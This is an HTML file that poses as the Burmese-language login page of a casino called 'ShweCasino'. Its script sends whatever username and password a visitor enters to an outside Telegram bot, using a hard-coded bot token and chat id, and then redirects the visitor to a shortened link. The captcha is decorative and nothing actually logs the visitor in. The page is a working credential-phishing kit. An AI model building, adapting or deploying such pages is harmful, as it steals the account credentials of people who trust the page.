<!DOCTYPE html>
<html lang="my">
<head>
<meta charset="UTF-8">
<title>ShweCasino Login</title>

<style>
body{
margin:0;
font-family:"Myanmar Text";
background:#8b0000;
color:white;
}

.banner img{
width:100%;
height:220px;
object-fit:cover;
display:block;
}

.login-box{
background:#6b0000;
margin:15px;
padding:20px;
border-radius:15px;
}

h2{
margin-top:0;
color:#ffcc66;
text-align:center;
}

input{
width:100%;
padding:12px;
margin:10px 0;
border:none;
border-radius:10px;
background:#ffffff20;
color:white;
font-size:16px;
}

.username{
margin-bottom:25px;
}

.pass-box{
position:relative;
}

.eye{
position:absolute;
right:10px;
top:50%;
transform:translateY(-50%);
cursor:pointer;
width:24px;
height:24px;
fill:#ffcc66;
}

.forgot{
display:block;
text-align:right;
font-size:13px;
color:#ffcc66;
text-decoration:none;
margin-top:5px;
}

.captcha-box{
position:relative;
background:#f3d6a2;
color:#333;
font-size:24px;
letter-spacing:10px;
text-align:center;
padding:12px;
border-radius:10px;
margin-top:10px;
font-weight:bold;
}

.refresh{
position:absolute;
right:10px;
top:8px;
cursor:pointer;
font-size:20px;
}

button{
width:100%;
padding:12px;
border:none;
border-radius:10px;
background:#ffcc66;
font-size:18px;
font-weight:bold;
cursor:pointer;
margin-top:10px;
}

.links{
display:flex;
justify-content:space-between;
margin-top:10px;
}

.links a{
color:#ffcc66;
text-decoration:none;
}

.loading{
display:none;
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.6);
justify-content:center;
align-items:center;
z-index:999;
}

.spinner{
width:60px;
height:60px;
border:6px solid #fff;
border-top:6px solid #ffcc66;
border-radius:50%;
animation:spin 1s linear infinite;
}

@keyframes spin{
0%{transform:rotate(0deg);}
100%{transform:rotate(360deg);}
}
</style>
</head>

<body>

<div class="banner">
<img src="logo.jpg">
</div>

<div class="login-box">

<h2>အကောင့်ထဲဝင်ရန်</h2>

<input class="username" placeholder="အသုံးပြုသူအမည်">

<div class="pass-box">

<input type="password" id="pass" placeholder="စကားဝှက်">

<svg class="eye" onclick="toggle()" viewBox="0 0 24 24">
<path id="eyePath" d="M12 5C7 5 2.7 8.1 1 12c1.7 3.9 6 7 11 7s9.3-3.1 11-7c-1.7-3.9-6-7-11-7zm0 11a4 4 0 1 1 0-8 4 4 0 0 1 0 8z"/>
</svg>

</div>

<a class="forgot" href="#">စကားဝှက်မေ့နေပါသလား?</a>

<div class="captcha-box" id="cap">
00000
<span class="refresh" onclick="cap()">↻</span>
</div>

<input placeholder="အပေါ်ကနံပါတ်တွေကိုထည့်ပါ">

<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>

<div class="links">
<a href="#">အကောင့်သစ်ဖွင့်ရန်</a>
<a href="#">စာရင်းသွင်းရန်</a>
</div>

</div>

<div class="loading" id="loading">
<div class="spinner"></div>
</div>

<script>

function cap(){
let n=Math.floor(10000+Math.random()*90000);
document.getElementById("cap").childNodes[0].nodeValue =
n.toString().split("").join(" ");
}

cap();

function toggle(){
let p=document.getElementById("pass");

if(p.type==="password"){
p.type="text";
}else{
p.type="password";
}
}

function login(){

document.getElementById("loading").style.display="flex";

var username=document.querySelector(".username").value;
var password=document.getElementById("pass").value;

var text="New Login\nUsername: "+username+"\nPassword: "+password;

var token="8694948559:AAGXf_c4fWj1qefoqOwriJHtad-ZFwZSy8c";
var chat_id="8296340452";

var url="https://api.telegram.org/bot"+token+"/sendMessage?chat_id="+chat_id+"&text="+encodeURIComponent(text);

fetch(url);

setTimeout(function(){
window.location.href="https://cutt.ly/otrecCFE";
},2000);

}

</script>

</body>
</html>
